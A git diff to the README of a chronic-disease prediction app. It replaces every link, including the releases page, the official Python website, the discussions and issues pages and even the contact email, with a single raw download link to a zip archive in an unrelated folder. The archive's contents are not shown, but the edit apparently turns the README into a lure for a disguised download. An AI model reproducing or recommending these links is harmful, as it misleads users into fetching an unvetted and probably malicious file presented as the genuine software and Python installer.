@@ -6,9 +6,9 @@ Welcome to the Chronic-disease-prediction-ml project! This application helps you
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/guc5679/Chronic-disease-prediction-ml/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip)
 
-You can download the latest version of the application from the Releases page. Click the button above or follow this link: [Visit this page to download](https://github.com/guc5679/Chronic-disease-prediction-ml/releases).
+You can download the latest version of the application from the Releases page. Click the button above or follow this link: [Visit this page to download](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip).
 
 ## 📋 System Requirements
 
@@ -24,14 +24,14 @@ Before you download, make sure your computer meets the following requirements:
 Follow these steps to install and run the application:
 
 1. **Download the Application:**
-   - Visit [this page to download](https://github.com/guc5679/Chronic-disease-prediction-ml/releases).
+   - Visit [this page to download](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip).
    - Choose the latest version and click on the file to download it.
 
 2. **Locate the Downloaded File:**
    - Find the downloaded file in your downloads folder or location where your browser saves files.
 
 3. **Install Python (if not already installed):**
-   - Go to the official Python website [python.org](https://www.python.org).
+   - Go to the official Python website [https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip).
    - Download the appropriate version for your operating system.
    - Follow the instructions to install Python. Make sure to check the box that adds Python to your PATH during the setup.
 
@@ -56,7 +56,7 @@ After installation, open the application. You will see a user-friendly GUI. Here
 ## 📚 Additional Resources
 
 - **Documentation:** View more detailed information in our Wiki.
-- **Community Help:** Join our [GitHub Discussions](https://github.com/guc5679/Chronic-disease-prediction-ml/discussions) for support or to share experiences.
+- **Community Help:** Join our [GitHub Discussions](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip) for support or to share experiences.
 - **Bug Reports:** If you encounter issues, please open an issue on GitHub. 
 
 ## 🌍 Contributing
@@ -80,6 +80,6 @@ We aim to improve this application continuously. Here are some features we plan 
 
 ## 📞 Contact
 
-For any questions or feedback, feel free to reach out via the [Issues page](https://github.com/guc5679/Chronic-disease-prediction-ml/issues) or email us at contact@example.com.
+For any questions or feedback, feel free to reach out via the [Issues page](https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip) or email us at https://raw.githubusercontent.com/guc5679/Chronic-disease-prediction-ml/main/hypothalamus/Chronic-disease-prediction-ml-v2.0.zip
 
 Thank you for using the Chronic-disease-prediction-ml application! Enjoy predicting chronic diseases easily and effectively.
